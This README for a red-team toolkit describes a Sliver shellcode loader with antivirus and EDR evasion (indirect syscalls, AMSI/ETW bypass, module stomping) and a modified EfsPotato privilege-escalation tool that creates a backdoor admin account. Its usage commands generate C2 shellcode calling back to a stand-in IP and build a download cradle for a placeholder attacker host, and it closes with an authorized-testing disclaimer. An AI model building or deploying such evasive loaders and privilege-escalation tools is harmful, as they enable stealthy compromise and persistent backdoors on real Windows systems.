# Redteam-tools

Custom red team tools for authorized pentesting engagements.

## Tools

### sliver_loader

Shellcode loader with multiple evasion techniques:
- Indirect syscalls (runtime ntdll parsing, no hardcoded syscall numbers)
- Hardware breakpoint AMSI/ETW bypass (DR0-DR3, no memory patching)
- Module stomping (overwrites signed DLL .text section)
- AES-256-CBC encryption + zlib compression
- Self-signed code signing
- Entropy padding to avoid high-entropy detection

Two versions available:
- Network loader: downloads payload at runtime from HTTP
- Standalone: embedded payload, no network needed

**Usage:**
```bash
# Generate shellcode (Sliver example)
sliver> generate --mtls IP:443 --os windows --arch amd64 --format shellcode --

# Pack for network loader
python generate.py http://YOUR_IP -o cradle.txt

# Or build standalone
./build.sh standalone beacon.bin
```
Dependencies: mingw-w64, osslsigncode, pycryptodome

### seimpersonate_abuse

Modified EFSPotato for SeImpersonatePrivilege abuse with AV evasion. Based on thub.com/zcgonvh/EfsPotato).

Changes from original:
- String obfuscation
- Dynamic API resolution
- Stripped PE metadata

Usage:
efspotato.exe
Creates a backdoor local admin account.

Disclaimer

These tools are for authorized security testing only. Do not use against systems without explicit written permission.
```

